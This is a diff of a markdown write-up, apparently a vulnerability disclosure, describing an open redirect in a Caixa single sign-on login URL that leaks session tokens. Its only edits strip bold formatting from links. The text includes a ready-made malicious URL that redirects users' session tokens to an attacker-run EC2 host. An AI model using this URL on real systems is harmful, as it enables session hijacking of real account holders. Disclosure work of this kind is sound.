@@ -33,7 +33,7 @@ I took a closer look at the URL structure of the page in question to understand 
 
 The URL in question was as follows:
 
-[**https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login**](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login)
+[https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login)
 
 
 The last parameter of the URL was what drew attention to the potential vulnerability: **&redirect_uri=**
@@ -48,7 +48,7 @@ In order to validate this theory, I changed the value of the **&redirect_uri=** 
 
 Well, here we have the Open Redirect vulnerability. To my surprise, however, I was not just redirected to the page, and during the redirect another parameter was sent. We can see this at the URL:
 
-[**https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7**](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)
+[https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)
 
 This content in the **“?code=”** parameter aroused my curiosity. Understanding a little more of the original request, I was able to conclude that the value of this parameter is a Session Token.
 
@@ -91,7 +91,7 @@ This code is responsible for capturing and storing Session Tokens sent to the ma
 
 The malicious URL was as follows:
 
-[**https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/**](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)
+[https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)
 
 And this was the result:
 
